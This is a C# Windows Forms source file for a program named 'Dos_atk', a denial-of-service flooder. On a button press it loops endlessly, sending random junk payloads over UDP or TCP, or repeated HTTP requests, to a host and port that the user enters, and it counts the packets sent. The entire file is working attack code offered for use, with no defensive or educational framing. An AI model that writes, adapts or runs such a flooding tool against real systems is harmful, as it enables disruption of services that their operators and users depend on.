using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dos_atk
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }
        Thread threadStart;
        bool exit = false;
        //SendUdp(11000, "192.168.2.255", 11000, Encoding.ASCII.GetBytes("Hello!"));
        private void SendUdp(int srcPort, string dstIp, int dstPort, byte[] data, int interval)
        {
            while (!exit)
            {   try{
                using (UdpClient c = new UdpClient(srcPort))
                    c.Send(data, data.Length, dstIp, dstPort);
                Thread.Sleep(interval);
                packet.Text = (int.Parse(packet.Text) + 1).ToString() ;
            }
            catch { error.Text = (int.Parse(error.Text) + 1).ToString(); }
            }
        }

        private void SendHttp(string dstURL, int dstPort, byte[] data, int interval)
        {
            data = null;
            while (!exit)
            {
                try
                {

                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://"+dstURL);
  		            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
  		            Stream stream = response.GetResponseStream();
  		            StreamReader reader = new StreamReader(stream);
  
 		            string dfata = reader.ReadToEnd();
 
 		            reader.Close();
 		            stream.Close();
                    Thread.Sleep(interval);
                    packet.Text = (int.Parse(packet.Text) + 1).ToString();
                }
                catch { error.Text = (int.Parse(error.Text) + 1).ToString(); }
            }
        }
        private void SendTcp(string dstURL, int dstPort, byte[] data,int interval)
        {
            while (!exit)
            {
                try
                {
                    Socket clientSocket = new Socket(AddressFamily.InterNetwork,
                        SocketType.Stream, ProtocolType.Tcp);
                    clientSocket.Connect(new IPEndPoint(IPAddress.Parse(dstURL), dstPort));
                    clientSocket.Send(data);
                    clientSocket.Close();
                    Thread.Sleep(interval);
                    packet.Text = (int.Parse(packet.Text) + 1).ToString();
                }
                catch { error.Text = (int.Parse(error.Text) + 1).ToString(); }
            }
        }

        private void startBtn_Click(object sender, EventArgs e)
        {
            if (startBtn.Text == "START")
            {
                startBtn.Text = "STOP";
                exit = false;
                error.Text = "0";
                packet.Text = "0";
                threadStart = new Thread(new ThreadStart(Start));
                threadStart.Start();
            }
            else 
            {
                threadStart.Abort();
                exit = true;
                startBtn.Text = "START";
            }
        }

        
        
        private void Start()
        {
            byte[] junkArray=new byte[int.Parse(lenghtTbox.Text)];
            Random r = new Random();
            r.NextBytes(junkArray);

            if (udpRadioBtn.Checked == true)
            {
                SendUdp(int.Parse(udpPort.Text), urlTbox.Text, int.Parse(portTbox.Text), junkArray, int.Parse(intervalTbox.Text));
            }
            else if (tcpRadioBtn.Checked == true)
            {
                string ip = urlTbox.Text;
                if (!IsIP(ip))
                {
                    ip = Dns.GetHostAddresses(ip)[0].ToString() ;
                }
                SendTcp(ip, int.Parse(portTbox.Text), junkArray, int.Parse(intervalTbox.Text));
            }
            else
            {
                SendHttp(urlTbox.Text, int.Parse(portTbox.Text), junkArray, int.Parse(intervalTbox.Text));
            }
        }
        private bool IsIP(string IP)
        {
            return System.Text.RegularExpressions.Regex.IsMatch(IP, @"\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\b");
        }
    }
}